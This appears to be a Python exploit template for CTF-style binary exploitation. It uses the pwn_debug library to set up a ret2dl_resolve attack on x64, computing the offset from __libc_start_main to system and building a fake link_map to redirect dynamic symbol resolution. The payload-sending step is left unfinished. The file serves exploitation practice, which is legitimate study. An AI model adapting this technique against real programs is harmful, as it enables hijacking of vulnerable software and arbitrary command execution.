# File: ret2dl_resolve_x64.py
# Author: raycp
# Date: 2019-05-31
# Description: template for ret2dl_resolve in x64 architecture

from pwn_debug import *


pdbg=pwn_debug("./binary")

pdbg.context.terminal=['tmux', 'splitw', '-h']

#pdbg.local()
pdbg.debug("2.23")
#pdbg.remote('127.0.0.1', 22)
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")
membp=pdbg.membp
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc


def pwn():

    #pdbg.bp([])
    base_addr=0x0    
    
    offset=libc.symbols['system']-libc.symbols['__libc_start_main']
    got_libc_address=elf.got['__libc_start_main']

    ret2dl_resolve=pdbg.ret2dl_resolve()
    # fake_link_map address is base_addr
    fake_link_map=ret2dl_resolve.build_link_map(base_addr,1,offset,got_libc_address)
    #def build_link_map(self,fake_addr,reloc_index,offset,got_libc_address):
		#return fake_link_map
   

    
    p.interactive() 

if __name__ == '__main__':
    pwn()


